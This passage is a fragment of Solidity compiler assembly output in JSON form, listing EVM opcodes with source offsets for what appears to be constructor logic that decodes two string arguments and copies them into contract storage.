									"begin": 1151,
									"end": 1153,
									"name": "PUSH",
									"source": 5,
									"value": "40"
								},
								{
									"begin": 1139,
									"end": 1148,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 1130,
									"end": 1137,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 1126,
									"end": 1149,
									"name": "SUB",
									"source": 5
								},
								{
									"begin": 1122,
									"end": 1154,
									"name": "SLT",
									"source": 5
								},
								{
									"begin": 1119,
									"end": 1171,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 1119,
									"end": 1171,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "29"
								},
								{
									"begin": 1119,
									"end": 1171,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 1167,
									"end": 1168,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 1164,
									"end": 1165,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 1157,
									"end": 1169,
									"name": "REVERT",
									"source": 5
								},
								{
									"begin": 1119,
									"end": 1171,
									"name": "tag",
									"source": 5,
									"value": "29"
								},
								{
									"begin": 1119,
									"end": 1171,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 1194,
									"end": 1210,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 1194,
									"end": 1210,
									"name": "MLOAD",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "40"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": 1259,
									"end": 1273,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 1259,
									"end": 1273,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 1259,
									"end": 1273,
									"name": "GT",
									"source": 5
								},
								{
									"begin": 1256,
									"end": 1290,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 1256,
									"end": 1290,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "30"
								},
								{
									"begin": 1256,
									"end": 1290,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 1286,
									"end": 1287,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 1283,
									"end": 1284,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 1276,
									"end": 1288,
									"name": "REVERT",
									"source": 5
								},
								{
									"begin": 1256,
									"end": 1290,
									"name": "tag",
									"source": 5,
									"value": "30"
								},
								{
									"begin": 1256,
									"end": 1290,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 1309,
									"end": 1370,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "31"
								},
								{
									"begin": 1362,
									"end": 1369,
									"name": "DUP7",
									"source": 5
								},
								{
									"begin": 1353,
									"end": 1359,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 1342,
									"end": 1351,
									"name": "DUP8",
									"source": 5
								},
								{
									"begin": 1338,
									"end": 1360,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 1309,
									"end": 1370,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "11"
								},
								{
									"begin": 1309,
									"end": 1370,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 1309,
									"end": 1370,
									"name": "tag",
									"source": 5,
									"value": "31"
								},
								{
									"begin": 1309,
									"end": 1370,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 1299,
									"end": 1370,
									"name": "SWAP4",
									"source": 5
								},
								{
									"begin": 1299,
									"end": 1370,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 1416,
									"end": 1418,
									"name": "PUSH",
									"source": 5,
									"value": "20"
								},
								{
									"begin": 1405,
									"end": 1414,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 1401,
									"end": 1419,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 1395,
									"end": 1420,
									"name": "MLOAD",
									"source": 5
								},
								{
									"begin": 1379,
									"end": 1420,
									"name": "SWAP2",
									"source": 5
								},
								{
									"begin": 1379,
									"end": 1420,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 1445,
									"end": 1447,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 1435,
									"end": 1443,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 1432,
									"end": 1448,
									"name": "GT",
									"source": 5
								},
								{
									"begin": 1429,
									"end": 1465,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 1429,
									"end": 1465,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "32"
								},
								{
									"begin": 1429,
									"end": 1465,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 1461,
									"end": 1462,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 1458,
									"end": 1459,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 1451,
									"end": 1463,
									"name": "REVERT",
									"source": 5
								},
								{
									"begin": 1429,
									"end": 1465,
									"name": "tag",
									"source": 5,
									"value": "32"
								},
								{
									"begin": 1429,
									"end": 1465,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 1429,
									"end": 1465,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 1484,
									"end": 1547,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "33"
								},
								{
									"begin": 1539,
									"end": 1546,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 1528,
									"end": 1536,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 1517,
									"end": 1526,
									"name": "DUP7",
									"source": 5
								},
								{
									"begin": 1513,
									"end": 1537,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 1484,
									"end": 1547,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "11"
								},
								{
									"begin": 1484,
									"end": 1547,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 1484,
									"end": 1547,
									"name": "tag",
									"source": 5,
									"value": "33"
								},
								{
									"begin": 1484,
									"end": 1547,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 1474,
									"end": 1547,
									"name": "SWAP2",
									"source": 5
								},
								{
									"begin": 1474,
									"end": 1547,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 1474,
									"end": 1547,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 991,
									"end": 1553,
									"name": "SWAP3",
									"source": 5
								},
								{
									"begin": 991,
									"end": 1553,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 991,
									"end": 1553,
									"name": "SWAP3",
									"source": 5
								},
								{
									"begin": 991,
									"end": 1553,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 991,
									"end": 1553,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 991,
									"end": 1553,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 1558,
									"end": 1938,
									"name": "tag",
									"source": 5,
									"value": "12"
								},
								{
									"begin": 1558,
									"end": 1938,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 1637,
									"end": 1638,
									"name": "PUSH",
									"source": 5,
									"value": "1"
								},
								{
									"begin": 1633,
									"end": 1645,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 1633,
									"end": 1645,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 1633,
									"end": 1645,
									"name": "SHR",
									"source": 5
								},
								{
									"begin": 1633,
									"end": 1645,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 1680,
									"end": 1692,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 1680,
									"end": 1692,
									"name": "AND",
									"source": 5
								},
								{
									"begin": 1680,
									"end": 1692,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 1701,
									"end": 1762,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "35"
								},
								{
									"begin": 1701,
									"end": 1762,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 1755,
									"end": 1759,
									"name": "PUSH",
									"source": 5,
									"value": "7F"
								},
								{
									"begin": 1747,
									"end": 1753,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 1743,
									"end": 1760,
									"name": "AND",
									"source": 5
								},
								{
									"begin": 1733,
									"end": 1760,
									"name": "SWAP2",
									"source": 5
								},
								{
									"begin": 1733,
									"end": 1760,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 1701,
									"end": 1762,
									"name": "tag",
									"source": 5,
									"value": "35"
								},
								{
									"begin": 1701,
									"end": 1762,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 1808,
									"end": 1810,
									"name": "PUSH",
									"source": 5,
									"value": "20"
								},
								{
									"begin": 1800,
									"end": 1806,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 1797,
									"end": 1811,
									"name": "LT",
									"source": 5
								},
								{
									"begin": 1777,
									"end": 1795,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 1774,
									"end": 1812,
									"name": "SUB",
									"source": 5
								},
								{
									"begin": 1771,
									"end": 1932,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "36"
								},
								{
									"begin": 1771,
									"end": 1932,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 1854,
									"end": 1864,
									"name": "PUSH",
									"source": 5,
									"value": "4E487B71"
								},
								{
									"begin": 1849,
									"end": 1852,
									"name": "PUSH",
									"source": 5,
									"value": "E0"
								},
								{
									"begin": 1845,
									"end": 1865,
									"name": "SHL",
									"source": 5
								},
								{
									"begin": 1842,
									"end": 1843,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 1835,
									"end": 1866,
									"name": "MSTORE",
									"source": 5
								},
								{
									"begin": 1889,
									"end": 1893,
									"name": "PUSH",
									"source": 5,
									"value": "22"
								},
								{
									"begin": 1886,
									"end": 1887,
									"name": "PUSH",
									"source": 5,
									"value": "4"
								},
								{
									"begin": 1879,
									"end": 1894,
									"name": "MSTORE",
									"source": 5
								},
								{
									"begin": 1917,
									"end": 1921,
									"name": "PUSH",
									"source": 5,
									"value": "24"
								},
								{
									"begin": 1914,
									"end": 1915,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 1907,
									"end": 1922,
									"name": "REVERT",
									"source": 5
								},
								{
									"begin": 1771,
									"end": 1932,
									"name": "tag",
									"source": 5,
									"value": "36"
								},
								{
									"begin": 1771,
									"end": 1932,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 1771,
									"end": 1932,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 1558,
									"end": 1938,
									"name": "SWAP2",
									"source": 5
								},
								{
									"begin": 1558,
									"end": 1938,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 1558,
									"end": 1938,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 1558,
									"end": 1938,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 2069,
									"end": 2614,
									"name": "tag",
									"source": 5,
									"value": "14"
								},
								{
									"begin": 2069,
									"end": 2614,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 2171,
									"end": 2173,
									"name": "PUSH",
									"source": 5,
									"value": "1F"
								},
								{
									"begin": 2166,
									"end": 2169,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 2163,
									"end": 2174,
									"name": "GT",
									"source": 5
								},
								{
									"begin": 2160,
									"end": 2608,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 2160,
									"end": 2608,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "39"
								},
								{
									"begin": 2160,
									"end": 2608,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 2207,
									"end": 2208,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 2232,
									"end": 2237,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 2228,
									"end": 2230,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 2221,
									"end": 2238,
									"name": "MSTORE",
									"source": 5
								},
								{
									"begin": 2277,
									"end": 2281,
									"name": "PUSH",
									"source": 5,
									"value": "20"
								},
								{
									"begin": 2273,
									"end": 2275,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 2263,
									"end": 2282,
									"name": "KECCAK256",
									"source": 5
								},
								{
									"begin": 2347,
									"end": 2349,
									"name": "PUSH",
									"source": 5,
									"value": "1F"
								},
								{
									"begin": 2335,
									"end": 2345,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 2331,
									"end": 2350,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 2328,
									"end": 2329,
									"name": "PUSH",
									"source": 5,
									"value": "5"
								},
								{
									"begin": 2324,
									"end": 2351,
									"name": "SHR",
									"source": 5
								},
								{
									"begin": 2318,
									"end": 2322,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 2314,
									"end": 2352,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 2383,
									"end": 2387,
									"name": "PUSH",
									"source": 5,
									"value": "20"
								},
								{
									"begin": 2371,
									"end": 2381,
									"name": "DUP7",
									"source": 5
								},
								{
									"begin": 2368,
									"end": 2388,
									"name": "LT",
									"source": 5
								},
								{
									"begin": 2365,
									"end": 2412,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 2365,
									"end": 2412,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "40"
								},
								{
									"begin": 2365,
									"end": 2412,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 2406,
									"end": 2410,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 2365,
									"end": 2412,
									"name": "tag",
									"source": 5,
									"value": "40"
								},
								{
									"begin": 2365,
									"end": 2412,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 2461,
									"end": 2463,
									"name": "PUSH",
									"source": 5,
									"value": "1F"
								},
								{
									"begin": 2456,
									"end": 2459,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 2452,
									"end": 2464,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 2449,
									"end": 2450,
									"name": "PUSH",
									"source": 5,
									"value": "5"
								},
								{
									"begin": 2445,
									"end": 2465,
									"name": "SHR",
									"source": 5
								},
								{
									"begin": 2439,
									"end": 2443,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 2435,
									"end": 2466,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 2425,
									"end": 2466,
									"name": "SWAP2",
									"source": 5
								},
								{
									"begin": 2425,
									"end": 2466,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 2516,
									"end": 2598,
									"name": "tag",
									"source": 5,
									"value": "41"
								},
								{
									"begin": 2516,
									"end": 2598,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 2534,
									"end": 2536,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 2527,
									"end": 2532,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 2524,
									"end": 2537,
									"name": "LT",
									"source": 5
								},
								{
									"begin": 2516,
									"end": 2598,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 2516,
									"end": 2598,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "43"
								},
								{
									"begin": 2516,
									"end": 2598,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 2579,
									"end": 2596,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 2579,
									"end": 2596,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 2579,
									"end": 2596,
									"name": "SSTORE",
									"source": 5
								},
								{
									"begin": 2560,
									"end": 2561,
									"name": "PUSH",
									"source": 5,
									"value": "1"
								},
								{
									"begin": 2549,
									"end": 2562,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 2516,
									"end": 2598,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "41"
								},
								{
									"begin": 2516,
									"end": 2598,
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 2516,
									"end": 2598,
									"name": "tag",
									"source": 5,
									"value": "43"
								},
								{
									"begin": 2516,
									"end": 2598,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 2520,
									"end": 2523,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 2520,
									"end": 2523,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 2520,
									"end": 2523,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 2160,
									"end": 2608,
									"name": "tag",
									"source": 5,
									"value": "39"
								},
								{
									"begin": 2160,
									"end": 2608,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 2069,
									"end": 2614,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 2069,
									"end": 2614,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 2069,
									"end": 2614,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 2069,
									"end": 2614,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 2790,
									"end": 4142,
									"name": "tag",
									"source": 5,
									"value": "7"
								},
								{
									"begin": 2790,
									"end": 4142,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 2910,
									"end": 2920,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 2910,
									"end": 2920,
									"name": "MLOAD",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "40"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": 2932,
									"end": 2962,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 2932,
									"end": 2962,
									"name": "GT",
									"source": 5
								},
								{
									"begin": 2929,
									"end": 2985,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 2929,
									"end": 2985,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "47"
								},
								{
									"begin": 2929,
									"end": 2985,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 2965,
									"end": 2983,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "47"
								},
								{
									"begin": 2965,
									"end": 2983,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "10"
								},
								{
									"begin": 2965,
									"end": 2983,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 2965,
									"end": 2983,
									"name": "tag",
									"source": 5,
									"value": "47"
								},
								{
									"begin": 2965,
									"end": 2983,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 2994,
									"end": 3091,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "48"
								},
								{
									"begin": 3084,
									"end": 3090,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 3044,
									"end": 3082,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "49"
								},
								{
									"begin": 3076,
									"end": 3080,
									"name": "DUP5",
									"source": 5
								},
								{
									"begin": 3070,
									"end": 3081,
									"name": "SLOAD",
									"source": 5
								},
								{
									"begin": 3044,
									"end": 3082,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "12"
								},
								{
									"begin": 3044,
									"end": 3082,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 3044,
									"end": 3082,
									"name": "tag",
									"source": 5,
									"value": "49"
								},
								{
									"begin": 3044,
									"end": 3082,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 3038,
									"end": 3042,
									"name": "DUP5",
									"source": 5
								},
								{
									"begin": 2994,
									"end": 3091,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "14"
								},
								{
									"begin": 2994,
									"end": 3091,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 2994,
									"end": 3091,
									"name": "tag",
									"source": 5,
									"value": "48"
								},
								{
									"begin": 2994,
									"end": 3091,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 3146,
									"end": 3150,
									"name": "PUSH",
									"source": 5,
									"value": "20"
								},
								{
									"begin": 3146,
									"end": 3150,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 3210,
									"end": 3212,
									"name": "PUSH",
									"source": 5,
									"value": "1F"
								},
								{
									"begin": 3199,
									"end": 3213,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 3199,
									"end": 3213,
									"name": "GT",
									"source": 5
								},
								{
									"begin": 3227,
									"end": 3228,
									"name": "PUSH",
									"source": 5,
									"value": "1"
								},
								{
									"begin": 3222,
									"end": 3885,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 3222,
									"end": 3885,
									"name": "EQ",
									"source": 5
								},
								{
									"begin": 3222,
									"end": 3885,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "51"
								},
								{
									"begin": 3222,
									"end": 3885,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 3929,
									"end": 3930,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 3946,
									"end": 3952,
									"name": "DUP5",
									"source": 5
								},
								{
									"begin": 3943,
									"end": 4032,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 3943,
									"end": 4032,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "52"
								},
								{
									"begin": 3943,
									"end": 4032,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 3998,
									"end": 4017,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 3998,
									"end": 4017,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 3998,
									"end": 4017,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 3992,
									"end": 4018,
									"name": "MLOAD",
									"source": 5
								},
								{
									"begin": 3943,
									"end": 4032,
									"name": "tag",
									"source": 5,
									"value": "52"
								},
								{
									"begin": 3943,
									"end": 4032,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT",
									"source": -1
								},
								{
									"begin": 2747,
									"end": 2748,
									"name": "PUSH",
									"source": 5,
									"value": "3"
								},
								{
									"begin": 2743,
									"end": 2754,
									"name": "DUP7",
									"source": 5
								},
								{
									"begin": 2743,
									"end": 2754,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 2743,
									"end": 2754,
									"name": "SHL",
									"source": 5
								},
								{
									"begin": 2739,
									"end": 2763,
									"name": "SHR",
									"source": 5
								},
								{
									"begin": 2735,
									"end": 2764,
									"name": "NOT",
									"source": 5
								},
								{
									"begin": 2725,
									"end": 2765,
									"name": "AND",
									"source": 5
								},
								{
									"begin": 2771,
									"end": 2772,
									"name": "PUSH",
									"source": 5,
									"value": "1"
								},
								{
									"begin": 2767,
									"end": 2778,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 2767,
									"end": 2778,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 2767,
									"end": 2778,
									"name": "SHL",
									"source": 5
								},
								{
									"begin": 2722,
									"end": 2779,
									"name": "OR",
									"source": 5
								},
								{
									"begin": 4045,
									"end": 4126,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 4045,
									"end": 4126,
									"name": "SSTORE",
									"source": 5
								},
								{
									"begin": 3192,
									"end": 4136,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "43"
								},
								{
									"begin": 3192,
									"end": 4136,
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 3222,
									"end": 3885,
									"name": "tag",
									"source": 5,
									"value": "51"
								},
								{
									"begin": 3222,
									"end": 3885,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 2016,
									"end": 2017,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 2009,
									"end": 2023,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 2009,
									"end": 2023,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 2009,
									"end": 2023,
									"name": "MSTORE",
									"source": 5
								},
								{
									"begin": 2053,
									"end": 2057,
									"name": "PUSH",
									"source": 5,
									"value": "20"
								},
								{
									"begin": 2040,
									"end": 2058,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 2040,
									"end": 2058,
									"name": "KECCAK256",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1F"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT",
									"source": -1
								},
								{
									"begin": 3258,
									"end": 3278,
									"name": "DUP7",
									"source": 5
								},
								{
									"begin": 3258,
									"end": 3278,
									"name": "AND",
									"source": 5
								},
								{
									"begin": 3258,
									"end": 3278,
									"name": "SWAP2",
									"source": 5
								},
								{
									"begin": 3376,
									"end": 3612,
									"name": "tag",
									"source": 5,
									"value": "55"
								},
								{
									"begin": 3376,
									"end": 3612,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 3390,
									"end": 3397,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 3387,
									"end": 3388,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 3384,
									"end": 3398,
									"name": "LT",
									"source": 5
								},
								{
									"begin": 3376,
									"end": 3612,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 3376,
									"end": 3612,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "57"
								},
								{
									"begin": 3376,
									"end": 3612,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 3479,
									"end": 3498,
									"name": "DUP9",
									"source": 5
								},
								{
									"begin": 3479,
									"end": 3498,
									"name": "DUP7",
									"source": 5
								},
								{
									"begin": 3479,
									"end": 3498,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 3473,
									"end": 3499,
									"name": "MLOAD",
									"source": 5
								},
								{
									"begin": 3458,
									"end": 3500,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 3458,
									"end": 3500,
									"name": "SSTORE",
									"source": 5
								},
								{
									"begin": 3571,
									"end": 3598,
									"name": "SWAP5",
									"source": 5
								},
								{
									"begin": 3571,
									"end": 3598,
									"name": "DUP5",
									"source": 5
								},
								{
									"begin": 3571,
									"end": 3598,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 3571,
									"end": 3598,
									"name": "SWAP5",
									"source": 5
								},
								{
									"begin": 3539,
									"end": 3540,
									"name": "PUSH",
									"source": 5,
									"value": "1"
								},
								{
									"begin": 3527,
									"end": 3541,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 3527,
									"end": 3541,
									"name": "SWAP2",
									"source": 5
								},
								{
									"begin": 3527,
									"end": 3541,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 3527,
									"end": 3541,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 3406,
									"end": 3425,
									"name": "DUP5",
									"source": 5
								},
								{
									"begin": 3406,
									"end": 3425,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 3376,
									"end": 3612,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "55"
								},
								{
									"begin": 3376,
									"end": 3612,
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 3376,
									"end": 3612,
									"name": "tag",
									"source": 5,
									"value": "57"
								},
								{
									"begin": 3376,
									"end": 3612,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 3380,
									"end": 3383,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 3640,
									"end": 3646,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 3631,
									"end": 3638,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 3628,
									"end": 3647,
									"name": "LT",
									"source": 5
								},
								{
									"begin": 3625,
									"end": 3826,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 3625,
									"end": 3826,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "58"
								},
								{
									"begin": 3625,
									"end": 3826,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 3701,
									"end": 3720,
									"name": "DUP8",
									"source": 5
								},
								{
									"begin": 3701,
									"end": 3720,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 3701,
									"end": 3720,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 3695,
									"end": 3721,
									"name": "MLOAD",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT",
									"source": -1
								},
								{
									"begin": 3784,
									"end": 3785,
									"name": "PUSH",
									"source": 5,
									"value": "3"
								},
								{
									"begin": 3780,
									"end": 3794,
									"name": "DUP9",
									"source": 5
								},
								{
									"begin": 3780,
									"end": 3794,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 3780,
									"end": 3794,
									"name": "SHL",
									"source": 5
								},
								{
									"begin": 3796,
									"end": 3799,
									"name": "PUSH",
									"source": 5,
									"value": "F8"
								},
								{
									"begin": 3776,
									"end": 3800,
									"name": "AND",
									"source": 5
								},
								{
									"begin": 3772,
									"end": 3809,
									"name": "SHR",
									"source": 5
								},
								{
									"begin": 3768,
									"end": 3810,
									"name": "NOT",
									"source": 5
								},
								{
									"begin": 3753,
